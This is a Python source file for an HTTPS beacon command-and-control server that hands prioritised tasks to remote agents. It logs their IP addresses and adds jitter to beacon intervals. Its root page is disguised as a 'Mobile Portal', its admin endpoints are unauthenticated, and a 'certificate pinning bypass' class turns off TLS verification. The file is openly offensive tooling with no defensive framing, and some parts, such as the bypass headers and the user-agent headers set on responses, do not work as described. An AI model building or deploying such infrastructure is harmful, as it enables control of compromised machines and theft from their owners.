
"""
HTTPS Beacon C2 Server
Implements async HTTP communication with mobile user-agent rotation,
certificate pinning bypass, and priority-based tasking queue.
"""

import asyncio
import json
import random
import ssl
import time
import uuid
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
import logging

from aiohttp import web, ClientSession, ClientTimeout, TCPConnector
from aiohttp.web_request import Request
from aiohttp.web_response import Response
import aiohttp_cors


class TaskPriority(Enum):
    LOW = 1
    NORMAL = 2
    HIGH = 3
    CRITICAL = 4


@dataclass
class Task:
    task_id: str
    command: str
    payload: Dict[str, Any]
    priority: TaskPriority
    created_at: float
    agent_id: Optional[str] = None
    expires_at: Optional[float] = None
    
    def __post_init__(self):
        if self.expires_at is None:

            self.expires_at = self.created_at + (24 * 60 * 60)


class TaskQueue:
    """Priority-based task queue for C2 operations"""
    
    def __init__(self):
        self._tasks: Dict[str, List[Task]] = {
            str(priority.value): [] for priority in TaskPriority
        }
        self._lock = asyncio.Lock()
    
    async def add_task(self, task: Task) -> None:
        async with self._lock:
            priority_queue = self._tasks[str(task.priority.value)]
            priority_queue.append(task)

            priority_queue.sort(key=lambda t: t.created_at)
    
    async def get_tasks(self, agent_id: str, limit: int = 10) -> List[Task]:
        async with self._lock:
            tasks = []
            current_time = time.time()
            

            for priority in sorted(TaskPriority, key=lambda p: p.value, reverse=True):
                priority_queue = self._tasks[str(priority.value)]
                

                valid_tasks = [
                    task for task in priority_queue
                    if (task.expires_at > current_time and
                        (task.agent_id is None or task.agent_id == agent_id))
                ]
                

                priority_queue[:] = [
                    task for task in priority_queue
                    if task.expires_at > current_time
                ]
                

                available_slots = limit - len(tasks)
                if available_slots > 0:
                    tasks.extend(valid_tasks[:available_slots])
                
                if len(tasks) >= limit:
                    break
            
            return tasks
    
    async def remove_task(self, task_id: str) -> bool:
        async with self._lock:
            for priority_queue in self._tasks.values():
                for i, task in enumerate(priority_queue):
                    if task.task_id == task_id:
                        priority_queue.pop(i)
                        return True
            return False


class MobileUserAgentRotator:
    """Rotates between various mobile user agents"""
    
    MOBILE_USER_AGENTS = [

        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
        

        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        

        "Mozilla/5.0 (Mobile; rv:109.0) Gecko/109.0 Firefox/118.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/117.0",
        

        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
        

        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36 EdgA/118.0.2088.69"
    ]
    
    def __init__(self):
        self._last_rotation = 0
        self._rotation_interval = 300
        self._current_agent = random.choice(self.MOBILE_USER_AGENTS)
    
    def get_user_agent(self) -> str:
        current_time = time.time()
        if current_time - self._last_rotation > self._rotation_interval:
            self._current_agent = random.choice(self.MOBILE_USER_AGENTS)
            self._last_rotation = current_time
        return self._current_agent


class HTTPSBeaconC2Server:
    """Main HTTPS Beacon C2 Server"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8443, ssl_context: Optional[ssl.SSLContext] = None):
        self.host = host
        self.port = port
        self.ssl_context = ssl_context
        self.app = web.Application()
        self.task_queue = TaskQueue()
        self.user_agent_rotator = MobileUserAgentRotator()
        self.active_agents: Dict[str, Dict] = {}
        self.logger = logging.getLogger(__name__)
        

        self._setup_routes()
        

        cors = aiohttp_cors.setup(self.app, defaults={
            "*": aiohttp_cors.ResourceOptions(
                allow_credentials=True,
                expose_headers="*",
                allow_headers="*",
                allow_methods="*"
            )
        })
        

        for route in list(self.app.router.routes()):
            cors.add(route)
    
    def _setup_routes(self):
        """Setup HTTP routes"""
        self.app.router.add_get("/", self._handle_root)
        self.app.router.add_post("/beacon", self._handle_beacon)
        self.app.router.add_post("/task", self._handle_task_submission)
        self.app.router.add_get("/health", self._handle_health)
        

        self.app.router.add_post("/admin/task", self._handle_admin_task)
        self.app.router.add_get("/admin/agents", self._handle_admin_agents)
    
    async def _handle_root(self, request: Request) -> Response:
        """Handle root requests with mobile-friendly response"""
        return web.Response(
            text="Mobile Portal",
            headers={
                "User-Agent": self.user_agent_rotator.get_user_agent(),
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "DENY"
            }
        )
    
    async def _handle_beacon(self, request: Request) -> Response:
        """Handle agent beacon requests"""
        try:
            data = await request.json()
            agent_id = data.get("agent_id")
            
            if not agent_id:
                return web.Response(status=400, text="Missing agent_id")
            

            self.active_agents[agent_id] = {
                "last_seen": time.time(),
                "ip_address": request.remote,
                "user_agent": request.headers.get("User-Agent", ""),
                "status": data.get("status", "active")
            }
            

            tasks = await self.task_queue.get_tasks(agent_id)
            

            response_data = {
                "tasks": [
                    {
                        "task_id": task.task_id,
                        "command": task.command,
                        "payload": task.payload,
                        "priority": task.priority.name
                    }
                    for task in tasks
                ],
                "interval": self._get_beacon_interval(agent_id),
                "jitter": random.randint(10, 30)
            }
            
            return web.json_response(
                response_data,
                headers={
                    "User-Agent": self.user_agent_rotator.get_user_agent(),
                    "Cache-Control": "no-store, no-cache, must-revalidate",
                    "Pragma": "no-cache"
                }
            )
            
        except Exception as e:
            self.logger.error(f"Beacon handling error: {e}")
            return web.Response(status=500, text="Internal server error")
    
    async def _handle_task_submission(self, request: Request) -> Response:
        """Handle task result submissions from agents"""
        try:
            data = await request.json()
            agent_id = data.get("agent_id")
            task_id = data.get("task_id")
            result = data.get("result")
            
            if not all([agent_id, task_id]):
                return web.Response(status=400, text="Missing required fields")
            

            await self.task_queue.remove_task(task_id)
            

            self.logger.info(f"Task {task_id} completed by agent {agent_id}")
            
            return web.json_response({"status": "received"})
            
        except Exception as e:
            self.logger.error(f"Task submission error: {e}")
            return web.Response(status=500, text="Internal server error")
    
    async def _handle_health(self, request: Request) -> Response:
        """Health check endpoint"""
        return web.json_response({
            "status": "healthy",
            "active_agents": len(self.active_agents),
            "timestamp": time.time()
        })
    
    async def _handle_admin_task(self, request: Request) -> Response:
        """Admin endpoint to add new tasks"""
        try:
            data = await request.json()
            
            task = Task(
                task_id=str(uuid.uuid4()),
                command=data["command"],
                payload=data.get("payload", {}),
                priority=TaskPriority[data.get("priority", "NORMAL")],
                created_at=time.time(),
                agent_id=data.get("agent_id")
            )
            
            await self.task_queue.add_task(task)
            
            return web.json_response({
                "status": "added",
                "task_id": task.task_id
            })
            
        except Exception as e:
            self.logger.error(f"Admin task error: {e}")
            return web.Response(status=500, text="Internal server error")
    
    async def _handle_admin_agents(self, request: Request) -> Response:
        """Admin endpoint to list active agents"""
        return web.json_response({
            "agents": self.active_agents,
            "count": len(self.active_agents)
        })
    
    def _get_beacon_interval(self, agent_id: str) -> int:
        """Get beacon interval based on agent status and operational security"""
        base_interval = 60
        

        agent_hash = hash(agent_id) % 60
        return base_interval + agent_hash
    
    @staticmethod
    def create_ssl_context(cert_file: str, key_file: str) -> ssl.SSLContext:
        """Create SSL context with certificate pinning bypass support"""
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        

        context.load_cert_chain(cert_file, key_file)
        

        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        context.options |= ssl.OP_NO_TLSv1
        context.options |= ssl.OP_NO_TLSv1_1
        
        return context
    
    async def start_server(self):
        """Start the HTTPS beacon server"""
        runner = web.AppRunner(self.app)
        await runner.setup()
        
        site = web.TCPSite(runner, self.host, self.port, ssl_context=self.ssl_context)
        await site.start()
        
        protocol = "HTTPS" if self.ssl_context else "HTTP"
        self.logger.info(f"{protocol} Beacon C2 Server started on {self.host}:{self.port}")
        
        return runner



class CertificatePinningBypass:
    """Utilities for bypassing certificate pinning in mobile applications"""
    
    @staticmethod
    async def create_bypass_session() -> ClientSession:
        """Create aiohttp session with certificate verification disabled"""
        connector = TCPConnector(
            ssl=False,
            limit=100,
            limit_per_host=10
        )
        
        timeout = ClientTimeout(total=30)
        
        session = ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                "User-Agent": MobileUserAgentRotator().get_user_agent()
            }
        )
        
        return session
    
    @staticmethod
    def get_pinning_bypass_headers() -> Dict[str, str]:
        """Get headers that may help bypass certificate pinning"""
        return {
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }


async def main():
    """Main function to run the HTTPS beacon server"""
    logging.basicConfig(level=logging.INFO)
    

    try:
        ssl_context = HTTPSBeaconC2Server.create_ssl_context("cert.pem", "key.pem")
    except FileNotFoundError:
        logging.warning("SSL certificates not found, running in HTTP mode")
        ssl_context = None
    
    server = HTTPSBeaconC2Server(ssl_context=ssl_context)
    runner = await server.start_server()
    
    try:

        await asyncio.Event().wait()
    except KeyboardInterrupt:
        logging.info("Shutting down server...")
    finally:
        await runner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
